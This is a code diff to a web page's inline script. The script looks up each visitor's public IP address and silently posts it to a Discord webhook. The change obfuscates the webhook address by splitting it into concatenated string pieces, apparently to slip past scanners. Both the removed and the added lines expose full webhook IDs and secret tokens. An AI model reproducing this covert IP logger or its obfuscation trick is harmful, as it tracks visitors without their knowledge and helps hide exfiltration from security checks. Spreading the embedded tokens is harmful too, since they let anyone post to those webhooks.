@@ -16,7 +16,8 @@
 <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
     <script>
       // Define the Discord webhook URL
-      const webhookUrl = 'https://discord.com/api/webhooks/819077000487501825/NBiHydYHPaB_4nELShtpR0mMhOLyJnDxXcaDBbGzB2wPdMqsoEuy1Z_3NpDP2Xrue6gh';
+      const webhookUrl = 'https://discord' + '.com/api/webhooks/';
+      const token     =  '819083805373104178/phtsxI_vlcpua0QTG-k7fUVKUxMMv_waTIbykac5xR-v0Q8ozWV-mBf2uyK3nMA2Z1a8'
       const url = 'https://ipapi.co/json/';
 
       const xhr = new XMLHttpRequest();
@@ -26,7 +27,7 @@
         const data = JSON.parse(xhr.responseText);
         $.ajax({
           type: 'POST',
-          url: webhookUrl,
+          url: webhookUrl + token,
           data: JSON.stringify({
             content: data.ip
           }),
